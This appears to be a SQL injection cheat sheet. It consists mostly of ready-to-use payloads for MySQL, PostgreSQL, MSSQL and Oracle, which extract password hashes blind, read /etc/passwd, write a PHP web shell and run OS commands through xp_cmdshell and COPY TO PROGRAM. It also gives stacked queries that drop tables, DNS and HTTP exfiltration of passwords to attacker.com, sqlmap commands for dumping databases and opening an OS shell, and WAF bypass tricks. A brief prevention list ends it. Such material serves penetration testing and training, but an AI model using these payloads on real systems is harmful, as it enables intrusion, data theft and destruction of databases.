# SQL Injection Comprehensive Guide

> SQL injection (SQLi) is a code injection technique that might destroy your database. It is one of the most common web hacking techniques.

---

## Basic SQL Injection

### Error-Based SQLi
```sql
-- Trigger SQL error to extract info
' OR 1=1 --
' UNION SELECT NULL --
' AND 1=CONVERT(int, (SELECT @@version)) --
```

### Union-Based SQLi
```sql
-- Determine column count
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --  # Error here means 2 columns

-- Union select
' UNION SELECT NULL,NULL --
' UNION SELECT database(),user() --
' UNION SELECT table_name,column_name FROM information_schema.columns WHERE table_schema=database() --
```

### Boolean-Based Blind SQLi
```sql
-- True condition
' AND 1=1 --

-- False condition
' AND 1=2 --

-- Extract data bit by bit
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64 --
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 96 --
```

### Time-Based Blind SQLi
```sql
-- MySQL
' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 64, SLEEP(5), 0) --
' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --

-- PostgreSQL
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --

-- MSSQL
' IF (1=1) WAITFOR DELAY '0:0:5' --

-- Oracle
' AND (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3, ALL_USERS T4, ALL_USERS T5) ELSE 0 END FROM DUAL) --
```

---

## Database-Specific Payloads

### MySQL
```sql
-- Version
SELECT @@version
SELECT version()

-- Current database
SELECT database()

-- Current user
SELECT user()

-- List databases
SELECT schema_name FROM information_schema.schemata

-- List tables
SELECT table_name FROM information_schema.tables WHERE table_schema=database()

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Read files
SELECT LOAD_FILE('/etc/passwd')

-- Write files
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- Command execution (requires FILE privilege)
SELECT * FROM `users` INTO OUTFILE '/tmp/test.php' LINES TERMINATED BY '<?php phpinfo(); ?>'
```

### PostgreSQL
```sql
-- Version
SELECT version()

-- Current database
SELECT current_database()

-- List databases
SELECT datname FROM pg_database

-- List tables
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- Read files
CREATE TABLE files (content text);
COPY files FROM '/etc/passwd';
SELECT * FROM files;

-- Command execution
COPY (SELECT '') TO PROGRAM 'id'
```

### MSSQL
```sql
-- Version
SELECT @@version

-- Current database
SELECT DB_NAME()

-- Current user
SELECT SUSER_SNAME()

-- List databases
SELECT name FROM master..sysdatabases

-- List tables
SELECT name FROM sysobjects WHERE xtype='U'

-- Command execution
EXEC xp_cmdshell 'whoami'

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
```

### Oracle
```sql
-- Version
SELECT * FROM v$version

-- Current user
SELECT user FROM dual

-- List tables
SELECT table_name FROM all_tables

-- List columns
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- Read files
CREATE DIRECTORY test_dir AS '/tmp';
SELECT * FROM TABLE(DBMS_XSLPROCESSOR.READ2CLOB('/etc/passwd', NULL));
```

---

## Advanced Techniques

### Stacked Queries
```sql
'; DROP TABLE users; --
'; INSERT INTO users (username, password) VALUES ('admin', 'password'); --
```

### Out-of-Band (OOB) SQLi
```sql
-- DNS exfiltration (MySQL)
SELECT LOAD_FILE(CONCAT('\\', (SELECT password FROM users LIMIT 1), '.attacker.com'));

-- HTTP exfiltration (Oracle)
SELECT UTL_HTTP.request('http://attacker.com/' || (SELECT password FROM users LIMIT 1)) FROM dual;
```

### Second-Order SQLi
- Payload stored in database, executed later in different query
- Example: Registration form stores malicious username, admin panel queries it unsafely

---

## SQLMap Usage

```bash
# Basic scan
sqlmap -u "https://target.com/page.php?id=1" --batch

# Dump database
sqlmap -u "https://target.com/page.php?id=1" --dbs --batch

# Dump specific table
sqlmap -u "https://target.com/page.php?id=1" -D database_name -T users --dump --batch

-- OS shell
sqlmap -u "https://target.com/page.php?id=1" --os-shell --batch

# Cookie-based injection
sqlmap -u "https://target.com/page.php" --cookie="id=1*" --batch

# POST data injection
sqlmap -u "https://target.com/login.php" --data="username=admin&password=test" --batch

# JSON injection
sqlmap -u "https://target.com/api/login" --data='{"username":"admin","password":"test"}' --batch
```

---

## WAF Bypass Techniques

```sql
-- Encoding
SELECT/**/1/**/FROM/**/users
SELECT%0A1%0AFROM%0Ausers

-- Comment injection
SEL/**/ECT 1 FR/**/OM users

-- Null bytes
%00' UNION SELECT 1,2,3 --

-- Case variation
SeLeCt 1 FrOm UsErS

-- Alternative syntax
SELECT 1 FROM `users` WHERE `id` = 1
SELECT 1 FROM users WHERE id LIKE 1

-- Unicode normalization
SELECT％０Ａ１％０ＡFROM％０Ａusers
```

---

## Prevention

- Use parameterized queries (prepared statements)
- Use ORM frameworks properly
- Input validation and sanitization
- Principle of least privilege for database accounts
- Web Application Firewall (WAF)
- Regular security testing
